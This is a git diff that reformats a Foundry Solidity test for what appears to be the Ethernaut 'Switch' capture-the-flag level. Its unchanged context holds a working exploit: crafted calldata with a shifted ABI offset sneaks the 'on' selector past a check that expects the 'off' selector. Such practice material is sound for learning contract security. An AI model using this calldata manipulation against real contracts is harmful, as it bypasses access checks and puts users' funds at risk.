@@ -10,18 +10,18 @@ contract SwitchAttackTest is Test {
     Switch public instance;
 
     function setUp() public {
-       factory = new SwitchFactory();
-       instance = Switch(factory.createInstance(dummyPlayerAddress));
+        factory = new SwitchFactory();
+        instance = Switch(factory.createInstance(dummyPlayerAddress));
     }
 
     function test_ShouldNotBeImmediatelySolvable() public {
-        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), false);
+        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
     }
-    
+
     function testfail_ShouldRevertIfPlayerAttackIsWrong() public {
-         vm.startPrank(dummyPlayerAddress);
-         vm.expectRevert();
-         instance.flipSwitch("0x00");
+        vm.startPrank(dummyPlayerAddress);
+        vm.expectRevert();
+        instance.flipSwitch("0x00");
     }
 
     function test_ShouldAllowThePlayerToSolveTheLevel() public {
@@ -34,19 +34,18 @@ contract SwitchAttackTest is Test {
 
         // Build raw calldata from bytes
         bytes memory calldata_ = bytes.concat(
-            flipSelector,           //|4B flipSelector|
-            bytes32(uint256(68)),   //|32B ptr to _data in calldata (0x00..44)|
-            bytes32(uint256(0)),    //|32B 0x00..00|
-            offSelector,            //|4B offSelector|
-            bytes32(uint256(4)),    //|32B _data length (0x00..04)|
-            onSelector              //|4B _data[0] 4 MSB (onSelector)|
+            flipSelector, //|4B flipSelector|
+            bytes32(uint256(68)), //|32B ptr to _data in calldata (0x00..44)|
+            bytes32(uint256(0)), //|32B 0x00..00|
+            offSelector, //|4B offSelector|
+            bytes32(uint256(4)), //|32B _data length (0x00..04)|
+            onSelector //|4B _data[0] 4 MSB (onSelector)|
         );
-                
+
         // Attack through low level call
         (bool result,) = address(instance).call(calldata_);
         require(result);
 
-        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), true);
+        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
     }
-
 }
